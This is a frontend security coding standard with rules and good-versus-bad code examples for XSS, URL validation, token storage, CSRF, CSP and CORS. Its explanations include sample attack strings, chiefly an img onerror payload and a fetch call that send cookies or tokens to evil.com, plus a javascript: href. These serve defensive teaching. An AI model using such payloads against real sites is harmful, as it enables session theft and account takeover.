---
id: web-frontend-security
title: Frontend Security
scope: web-frontend
severity: critical
tags: [security, xss, csp, cors, auth-tokens, frontend, owasp, cwe]
references:
  - title: "OWASP — Cross-Site Scripting Prevention Cheat Sheet"
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
  - title: "CWE-79 — Cross-site Scripting (XSS)"
    url: https://cwe.mitre.org/data/definitions/79.html
  - title: "MDN — Content Security Policy (CSP)"
    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
  - title: "OWASP — CORS Cheat Sheet"
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html
  - title: "OWASP — CSRF Prevention Cheat Sheet"
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
  - title: "CWE-352 — Cross-Site Request Forgery (CSRF)"
    url: https://cwe.mitre.org/data/definitions/352.html
---

## Principle

The browser is hostile territory. Every value rendered into the DOM is a potential XSS vector. Every token stored client-side is a potential theft target. The frontend is a UX layer, not a security boundary — the server must enforce all security rules independently.

AI fails to generate XSS-safe code **86% of the time** (CWE-79/80). Auth token handling is frequently insecure — tokens in localStorage, no refresh flow, no expiry handling. This standard covers the client-side defenses that prevent the most common browser-side attacks.

## Rules

### XSS Prevention

1. **Never insert untrusted data into the DOM via raw HTML.** Do not use `innerHTML`, `outerHTML`, `document.write()`, `insertAdjacentHTML()`, or framework equivalents that bypass escaping (React's `dangerouslySetInnerHTML`, Vue's `v-html`, Angular's `bypassSecurityTrustHtml`). Use text content methods or framework default rendering, which auto-escapes. (CWE-79)

2. **Sanitize if raw HTML rendering is unavoidable.** When rendering user-generated rich text (markdown, WYSIWYG output), use a proven sanitizer library (DOMPurify) configured to allow only the specific tags and attributes needed. Never write a custom HTML sanitizer. (CWE-79)

3. **Encode dynamic values for their output context.** A value rendered in an HTML attribute needs HTML-attribute encoding. A value inserted into a URL needs URL encoding. A value embedded in JavaScript needs JavaScript encoding. The correct encoding depends on WHERE the value is placed, not what it contains. (CWE-116)

4. **Never construct URLs from user input without validation.** User-controlled values in `href`, `src`, `action`, or redirect targets can execute `javascript:` URIs or redirect to attacker-controlled sites. Apply all of the following:
   - **Scheme validation:** Parse the URL and check that the protocol is `http:` or `https:`. Block `javascript:`, `data:`, and `vbscript:` schemes.
   - **Relative path validation:** Require they start with `/` and do NOT start with `//` (protocol-relative URLs like `//evil.com` navigate to external sites).
   - **Redirect target restriction:** For redirect parameters (`next=`, `return_to=`, `redirect_uri=`), do NOT allow arbitrary external URLs even if they pass scheme validation. An attacker sets `next=https://phish.example/login` and the user is redirected to a convincing phishing page after login. Use one of:
     - **Path-only redirects (preferred):** Only accept relative paths (`/dashboard`, `/settings`). Reject any URL containing `://` or starting with `//`.
     - **Domain allowlist:** If external redirects are required, maintain an explicit list of trusted domains and reject all others.
   - Passing protocol and relative-path checks is not sufficient for redirect safety. (CWE-601)

### Auth Token Handling

5. **Store auth tokens in httpOnly cookies, not localStorage or sessionStorage.** Tokens in browser storage are accessible to any JavaScript running on the page — including XSS payloads. httpOnly cookies are not accessible to JavaScript, making them resistant to XSS-based token theft. (CWE-922)

6. **Pair cookie-based auth with layered CSRF protection.** httpOnly cookies are sent automatically by the browser — including from attacker-controlled sites (CSRF). `SameSite=Lax` alone has gaps: it permits cross-site top-level GET navigations, and state-changing GET endpoints (which should not exist but do) remain vulnerable. Required defenses for state-changing requests (POST, PUT, DELETE):
   - **Mandatory:** Set `SameSite=Lax` or `SameSite=Strict` on all auth cookies.
   - **Mandatory:** Include a CSRF token (synchronizer token or double-submit cookie) validated server-side on every state-changing request.
   - **Mandatory:** Never perform state changes on GET requests. GET must be idempotent.
   - **Recommended:** Verify `Origin` header server-side as an additional layer.
   - A single defense layer is insufficient. Both SameSite AND CSRF tokens are required. (CWE-352)

7. **Implement token refresh before expiry.** Access tokens should be short-lived (minutes, not hours). Refresh tokens extend sessions without requiring re-authentication. Implement silent refresh before the access token expires — not after the user gets a 401 error.

8. **Clear all auth state on logout.** On logout: invalidate the session server-side, clear httpOnly cookies (via server response), clear any in-memory auth state, and redirect to a public page. Do not rely on client-side token deletion alone — the server must also invalidate the session.

### Content Security Policy (CSP)

9. **Deploy a Content Security Policy that blocks inline scripts.** At minimum, set `script-src` to disallow `'unsafe-inline'` and `'unsafe-eval'`. Use nonce-based or hash-based CSP for inline scripts that are necessary. CSP is the strongest defense against XSS — even if an injection vulnerability exists, CSP prevents the injected script from executing. (CWE-79)

10. **Do not use `'unsafe-inline'` or `'unsafe-eval'` in production CSP.** These directives disable the primary protections CSP provides. If a library requires `eval()`, find an alternative or configure nonce-based exceptions. If inline styles are needed, use `style-src` with hashes rather than `'unsafe-inline'`.

### CORS

11. **Never set `Access-Control-Allow-Origin: *` on authenticated endpoints.** Wildcard CORS allows any website to make requests to your API. For endpoints that require authentication, set the allowed origins explicitly to your own domains. Wildcard is only appropriate for truly public, unauthenticated APIs. (CWE-346)

12. **Do not reflect the `Origin` header as the `Access-Control-Allow-Origin` value.** Reflecting the origin header from the request is equivalent to `*` but bypasses the browser's restriction on sending credentials with wildcard CORS. Maintain an explicit allowlist of trusted origins.

### Client-Side Validation

13. **Validate on the client for UX. Validate on the server for security.** Client-side validation provides instant feedback to users — it is not a security boundary. Every validation rule on the client must be duplicated on the server. An attacker can bypass the browser entirely and send any request they want to your API.

## Patterns

### XSS Prevention

#### Do This

```tsx
// React auto-escapes by default — use normal rendering
function UserComment({ comment }: { comment: string }) {
  return <p>{comment}</p>;  // Safely escaped — XSS-safe
}

// When raw HTML is genuinely needed, sanitize with DOMPurify
import DOMPurify from "dompurify";

function RichContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
    ALLOWED_ATTR: ["href"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

#### Not This

```tsx
// Rendering user input as raw HTML without sanitization (CWE-79)
function UserComment({ comment }: { comment: string }) {
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}
```

**Why it's wrong:** If `comment` contains `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`, the browser executes the attacker's JavaScript. The attacker steals cookies, session tokens, and can perform actions as the logged-in user. React's default rendering escapes HTML — `dangerouslySetInnerHTML` explicitly bypasses that protection.

### URL Validation

#### Do This

```typescript
// General link validation — safe for href/src attributes
function SafeLink({ url, children }: { url: string; children: React.ReactNode }) {
  const isAllowed =
    /^https?:\/\//.test(url) ||          // Absolute HTTP(S) URLs
    (url.startsWith("/") && !url.startsWith("//")); // Relative paths, NOT protocol-relative
  if (!isAllowed) {
    return <span>{children}</span>; // Not a link if URL is suspicious
  }
  return <a href={url}>{children}</a>;
}

// Redirect target validation — stricter, path-only by default
function safeRedirect(target: string, fallback = "/"): string {
  // Only allow relative paths — reject anything with :// or starting with //
  if (target.includes("://") || target.startsWith("//")) {
    return fallback;
  }
  if (!target.startsWith("/")) {
    return fallback;
  }
  return target;
}

// Usage: const next = safeRedirect(searchParams.get("next") ?? "/");
```

#### Not This

```typescript
// User-controlled href with no validation (CWE-79)
function UserLink({ url, label }: { url: string; label: string }) {
  return <a href={url}>{label}</a>;
}

// An attacker sets url to: javascript:alert(document.cookie)
```

**Why it's wrong:** `<a href="javascript:alert(document.cookie)">` executes JavaScript when clicked. Without URL scheme validation, any user-controlled `href` is an XSS vector. The same applies to `src`, `action`, and any attribute that loads or navigates to a URL.

### Token Storage

#### Do This

```typescript
// Server sets httpOnly cookie — JavaScript cannot read it
// POST /api/login → Response includes:
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

// Client sends credentials automatically with cookies
const response = await fetch("/api/orders", {
  credentials: "include", // Browser sends httpOnly cookie automatically
});
```

#### Not This

```typescript
// Storing token in localStorage — accessible to any XSS payload (CWE-922)
const token = await login(email, password);
localStorage.setItem("auth_token", token);

// Any XSS vulnerability can steal this token:
// fetch('https://evil.com/steal?token=' + localStorage.getItem('auth_token'))
```

**Why it's wrong:** `localStorage` is accessible to any JavaScript running on the page. A single XSS vulnerability — even in a third-party script — can read the token and send it to an attacker. httpOnly cookies are invisible to JavaScript, so even a successful XSS attack cannot steal the session token.

### Content Security Policy

#### Do This

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'nonce-abc123';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

#### Not This

```
Content-Security-Policy: default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';
```

**Why it's wrong:** `'unsafe-inline'` allows any inline `<script>` tag to execute — including those injected via XSS. `'unsafe-eval'` allows `eval()`, `Function()`, and `setTimeout("string")` — all XSS execution paths. `default-src *` allows loading resources from any origin. This CSP provides effectively zero protection.

## Exceptions

- **Server-side rendered (SSR) applications** where the initial HTML is generated server-side still need CSP and XSS protections — SSR does not eliminate client-side XSS risk once the page hydrates.
- **Static sites with no user input** (documentation, marketing pages) have lower XSS risk, but CSP should still be deployed to prevent injection via third-party scripts.
- **OAuth/OIDC flows** may require tokens in memory temporarily during the callback. Clear them immediately after exchange and store the session server-side.

## Cross-References

- [Security](core-security) — Universal input validation and output encoding principles
- [Backend Security](web-backend-security) — Server-side enforcement that client security depends on
- [Frontend Structure](web-frontend-structure) — Where security checks belong in the component tree
